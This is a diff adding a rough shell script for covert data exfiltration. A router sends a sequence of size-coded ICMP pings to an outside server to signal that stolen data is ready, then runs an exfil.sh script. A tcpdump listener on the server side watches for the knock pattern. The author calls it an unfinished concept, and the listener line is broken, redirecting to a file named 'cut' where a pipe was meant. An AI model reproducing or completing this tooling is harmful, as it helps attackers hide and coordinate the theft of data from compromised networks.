@@ -1,0 +1,24 @@
+# Ping knock from the router to notify server that xfil is ready and to start catch.sh script
+
+#!/bin/sh
+
+ping -c 1 -s 78 <ip>
+sleep 1
+ping -c 1 -s 58 <ip>
+sleep 1
+ping -c 1 -s 88 <ip>
+
+
+sleep 10
+exfil.sh
+
+
+# the server will need to monitor the incoming pings to see if the special sequence of icmp echo-request size
+# matches the predefined sequence
+
+# this still needs some work...basic concept
+
+#!/bin/sh
+tcpdump -i eth0 'icmp[icmptype] = icmp-echo' > cut -c 92-94
+
+# will probably need to send output to a pipe vs a file as it needs to be timely
